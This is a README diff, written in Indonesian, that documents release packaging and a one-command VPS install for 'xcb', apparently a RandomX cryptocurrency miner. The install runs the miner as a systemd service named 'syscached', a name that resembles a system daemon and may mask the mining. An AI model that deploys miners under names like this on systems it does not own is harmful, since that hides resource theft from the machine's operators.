@@ -49,6 +49,34 @@ Rollback manual:
 ./deploy.sh --rollback 20261105-112843
 ```
 
+## Rilis tarball dan VPS baru
+
+Tag `v*` memicu job `release`: artefak `xcb-2204` dikemas menjadi
+`xcb-<tag>-linux-x86_64.tar.gz` (+ `.sha256`) berisi `xcb`,
+`librandomx_v2.so`, `VERSION`, `SHA256SUMS`, `install.sh`,
+`syscached.service`, dan `miner.env.example`.
+
+```bash
+git tag v1.0.0
+git push origin v1.0.0
+```
+
+Di VPS baru:
+
+```bash
+curl -fLO https://github.com/ylxai/xcb-v2/releases/download/v1.0.0/xcb-v1.0.0-linux-x86_64.tar.gz
+curl -fLO https://github.com/ylxai/xcb-v2/releases/download/v1.0.0/xcb-v1.0.0-linux-x86_64.tar.gz.sha256
+sha256sum -c xcb-v1.0.0-linux-x86_64.tar.gz.sha256
+tar xzf xcb-v1.0.0-linux-x86_64.tar.gz
+sudo ./install.sh --wallet <alamat> --worker <nama>
+```
+
+`install.sh` memasang binary + library ke `/usr/local/bin`, menulis
+`/etc/xcb/miner.env` (0600), menyiapkan hugepages, memasang unit, lalu
+menjalankan `syscached`. `--dry-run` mencetak rencana tanpa mengubah apa pun.
+Kalau `install.sh` sudah ada di host, `--version v1.0.0` (atau `latest`)
+membuatnya mengunduh dan memverifikasi tarball rilis itu sendiri.
+
 ## Monitoring
 
 ```bash
